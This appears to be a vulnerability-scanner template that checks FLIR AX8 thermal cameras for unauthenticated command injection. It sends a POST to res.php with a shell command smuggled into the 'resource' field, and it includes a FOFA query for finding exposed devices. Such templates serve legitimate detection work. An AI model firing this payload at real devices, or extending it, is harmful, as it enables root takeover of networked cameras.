id: FLIR-AX8-RCE

info:
  name: FLIR-AX8-RCE
  author: momika233
  severity: high
  reference:
    - https://www.exploit-db.com/exploits/45602
  description: The FLIR AX8 thermal sensor camera suffers from two unauthenticated command injection vulnerabilities. The issues can be triggered when calling multiple unsanitized HTTP GET/POST parameters within the shell_exec function in res.php and palette.php file. This can be exploited to inject arbitrary system commands and gain root remote code execution.
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="FLIR-FLIR-AX8"

  tags: FLIR-AX8,RCE

requests:
  - raw:
      - |
        POST /res.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        action=node&resource=$(id)
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid=.*"
        part: body

      - type: status
        status:
          - 200
